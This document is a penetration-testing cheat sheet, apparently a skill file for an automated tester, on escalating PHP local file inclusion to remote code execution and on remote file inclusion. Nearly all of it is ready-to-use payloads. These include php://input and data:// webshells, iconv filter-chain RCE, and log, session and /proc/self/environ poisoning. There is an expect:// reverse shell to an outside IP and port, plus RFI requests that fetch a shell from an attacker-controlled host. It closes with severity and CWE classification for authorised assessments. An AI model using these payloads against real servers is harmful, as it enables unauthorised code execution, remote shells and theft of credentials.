# LFI → RCE Chains (PHP) and RFI

Precondition check: does the sink *execute* (include/require) or just *read*
(fopen/readfile/file_get_contents)? Error messages name the function. Reads
cap out at file disclosure; includes are the RCE path. Everything below
assumes PHP unless noted.

## 1. php://filter — read source (always try first)

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=../config.php
?file=php://filter/convert.base64-encode/resource=/etc/passwd
```

Base64 output avoids the PHP interpreter eating `<?php ... ?>`. Decode and
mine for credentials, keys, and additional sinks. Alternate filters when
base64 is blocked: `convert.iconv.utf-8.utf-16`,
`string.rot13`, chained: `php://filter/string.rot13|convert.base64-encode/resource=x`.

## 2. php://input (needs allow_url_include=On)

```
POST /view?file=php://input&c=id HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['c']); ?>
```

The POST body is included as PHP.

## 3. data:// (needs allow_url_include=On)

```
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg%3D%3D&c=id
```

Base64 form dodges input filters on `<?`.

## 4. expect:// (needs the expect extension)

```
?file=expect://id
?file=expect://bash$IFS-c$IFS'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'
```

Rare but instant RCE when present.

## 5. php://filter chain RCE (no uploads, no logs, default php.ini)

The `convert.iconv.*` filter-chain technique (synacktiv's
`php_filter_chain_generator.py`) builds an arbitrary PHP payload out of
charset-conversion garbage prepended to any readable resource:

```
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...<long chain>.../resource=php://temp&c=id
```

Works against plain `include($x)` with NO allow_url_include, no writable
logs, no upload — the modern default LFI→RCE. lfimap implements it. The
related `php_filter_chains_oracle` tool turns *blind* file-read primitives
(`file_get_contents`-style, content not reflected) into byte-by-byte reads
via error/time oracles.

## 6. Log poisoning

1. Plant PHP in a log you can include. Access log via User-Agent (use nc or
   curl -A; a *raw* socket avoids URL-encoding damage):

```
curl -A "<?php system(\$_GET['c']); ?>" http://192.0.2.10/
```

2. Include it: `?file=../../../../var/log/apache2/access.log&c=id`.

Log candidates: `/var/log/apache2/{access,error}.log`,
`/var/log/nginx/{access,error}.log`, `/var/log/httpd/access_log`,
`/var/log/auth.log` (poison via `ssh '<?php system($_GET[c]); ?>'@192.0.2.10`
— the failed username lands in auth.log), `/var/log/vsftpd.log`,
`/var/log/mail.log` (SMTP RCPT/VRFY poison), `/proc/self/fd/N` when the log
path is unknown (walk fd 0–30).

One malformed attempt (e.g. a stray quote that fatals) can poison the log
until rotation — get the payload right the first time; keep it short and
single-quoted-string-free.

## 7. /proc/self/environ

Older Apache/mod_php: `User-Agent: <?php system($_GET['c']); ?>` then
`?file=/proc/self/environ&c=id` — the UA appears in the environment block.
Mostly dead on modern php-fpm but costs one request.

## 8. PHP session files

Session data is serialized to `/var/lib/php/sessions/sess_<PHPSESSID>`
(also `/var/lib/php5/`, `/tmp/`). If any session value echoes your input
(username, language, search):

1. Set it: log in / set pref with value `<?php system($_GET['c']); ?>`.
2. Grab your `PHPSESSID` cookie, include:
   `?file=../../../../var/lib/php/sessions/sess_ab12cd34&c=id`.

## 9. phpinfo + LFI race (temp file)

If a phpinfo() page exists anywhere: file uploads create
`/tmp/phpXXXXXX` during the request; phpinfo leaks the random name in
`$_FILES`. Race: send a big multipart upload to the phpinfo page, read the
temp name from the partial response, include it via the LFI before PHP
cleans it up. Automated by the classic `phpinfolfi.py`; lfimap covers the
technique. Yields RCE with zero persistent artifacts.

Related: PHP_SESSION_UPLOAD_PROGRESS lets you force session creation and
inject content without credentials (`Cookie: PHPSESSID=s9l` +
multipart field `PHP_SESSION_UPLOAD_PROGRESS=<?php ... ?>`), then race
`sess_s9l` — works when `session.upload_progress.enabled=On` (default).

## 10. Include an uploaded file

Any file you can place on disk (avatar, log, cache, mail spool) is PHP once
included — extension irrelevant:

```
?file=../../uploads/avatar123.jpg&c=id      # EXIF/polyglot payload inside
```

Pair with the `file-upload-testing` skill (its polyglots are built for this).

## 11. RFI (CWE-98, needs allow_url_include=On)

```
?page=http://198.51.100.9/shell.txt
?page=http://198.51.100.9/shell.txt%00     # legacy suffix bypass
?page=//198.51.100.9/share/shell.txt       # SMB on Windows PHP (no allow_url_include needed for \\ UNC on some configs)
?page=ftp://198.51.100.9/shell.txt
```

Host `shell.txt` (NOT `.php` — your own server must serve source, not
execute it): `<?php system($_GET['c']); ?>`. Null-result debugging: check
your server's access log / use `http://<id>.oast.pro/x` with
interactsh-client — a DNS-only hit means outbound resolution happened but
HTTP egress is blocked (still report SSRF-adjacent behavior); an HTTP hit
with no execution means include succeeded but PHP tags were stripped or
short_open_tag issues — try `<?php` full tags, or data:// instead.

## Severity calls

- Arbitrary file read (passwd/configs): **high** (critical if creds/keys
  recovered and reused).
- LFI with any RCE chain confirmed, or RFI executing code: **critical**.
- Traversal limited to the web root / non-sensitive files: **medium**.
Classify: traversal/LFI = WSTG-INPV-11 + CWE-22 (CWE-98 when inclusion);
RFI = WSTG-INPV-12 + CWE-98. Pure authz-bypass directory escape in a
download handler also maps to WSTG-ATHZ-01.
